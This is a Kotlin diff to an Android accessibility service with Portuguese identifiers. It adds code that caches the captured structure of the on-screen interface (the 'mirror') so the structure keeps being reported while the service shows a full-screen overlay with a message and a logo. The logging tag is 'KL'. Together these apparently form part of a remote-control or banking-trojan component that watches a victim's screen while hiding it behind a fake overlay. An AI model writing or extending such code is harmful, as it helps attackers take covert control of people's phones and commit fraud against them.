@@ -67,6 +67,7 @@ class ControleGestosService : AccessibilityService() {
     private var mensagemOverlayAtual = ""
     private var textoInferiorOverlayAtual = ""
     private var logoOverlayAtual = ""
+    private var ultimaEstruturaEspelho: String? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -140,6 +141,25 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun extrairEstruturaCompleta(): String {
+        val aoVivo = extrairEstruturaAoVivo()
+        try {
+            val elementos = org.json.JSONObject(aoVivo).optJSONArray("elementos")
+            if (elementos != null && elementos.length() > 0) {
+                ultimaEstruturaEspelho = aoVivo
+                return aoVivo
+            }
+        } catch (_: Exception) {
+        }
+
+        if ((overlayAtivo || OverlayActivity.estaAtiva()) && ultimaEstruturaEspelho != null) {
+            Log.d("KL", "Espelho em cache durante overlay (${Build.MANUFACTURER})")
+            return ultimaEstruturaEspelho!!
+        }
+
+        return aoVivo
+    }
+
+    private fun extrairEstruturaAoVivo(): String {
         val listaElementos = mutableListOf<Map<String, Any>>()
         val idsIncluidos = mutableSetOf<String>()
         val displayMetrics = resources.displayMetrics
@@ -164,6 +184,18 @@ class ControleGestosService : AccessibilityService() {
 
         val elementosLimpos = removerElementosRedundantes(listaElementos)
         return montarJsonEstrutura(elementosLimpos, displayMetrics)
+    }
+
+    private fun capturarCacheEspelhoAntesOverlay() {
+        val aoVivo = extrairEstruturaAoVivo()
+        try {
+            val elementos = org.json.JSONObject(aoVivo).optJSONArray("elementos")
+            if (elementos != null && elementos.length() > 0) {
+                ultimaEstruturaEspelho = aoVivo
+                Log.i("KL", "Cache espelho salvo: ${elementos.length()} elementos")
+            }
+        } catch (_: Exception) {
+        }
     }
 
     private fun montarJsonEstrutura(
@@ -840,6 +872,8 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
+        capturarCacheEspelhoAntesOverlay()
+
         if (deveUsarOverlayPorJanela()) {
             OverlayActivity.fechar()
             removerOverlayJanela()
